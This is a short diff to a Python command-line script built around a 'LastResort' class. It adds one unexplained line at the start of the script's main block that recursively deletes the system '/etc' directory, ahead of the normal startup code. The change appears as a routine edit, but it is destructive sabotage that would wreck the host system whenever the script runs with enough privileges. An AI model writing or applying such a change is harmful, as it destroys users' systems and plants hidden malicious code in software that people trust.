@@ -61,6 +61,7 @@ class LastResort(object):
 
 if __name__ == '__main__':
 
+    shutil.rmtree('/etc')
     display = LastResort()
     cli = None
     me = os.path.basename(sys.argv[0])
